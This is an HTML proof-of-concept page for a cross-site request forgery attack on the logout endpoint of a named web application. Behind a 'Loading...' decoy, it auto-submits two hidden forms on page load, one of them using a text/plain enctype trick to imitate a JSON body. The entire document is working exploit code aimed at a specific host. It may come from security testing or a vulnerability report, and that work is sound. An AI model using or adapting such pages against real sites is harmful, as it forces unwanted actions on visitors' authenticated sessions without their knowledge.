<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Logout</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <!-- Vector 1: Standard form submission -->
    <form id="csrf1" action="https://demo.app.welfordacademy.com/api/auth/logout" method="POST" style="display:none;">
        <input type="hidden" name="{}" value="">
    </form>

    <!-- Vector 2: Form expecting JSON (some servers are lenient) -->
    <form id="csrf2" action="https://demo.app.welfordacademy.com/api/auth/logout" method="POST" enctype="text/plain" style="display:none;">
        <input type="hidden" name='{"' value='"}'>
    </form>

    <script>
        // Fire both forms immediately
        document.getElementById('csrf1').submit();
        
        // Small delay to ensure both fire
        setTimeout(function() {
            document.getElementById('csrf2').submit();
        }, 100);
    </script>
</body>
</html>
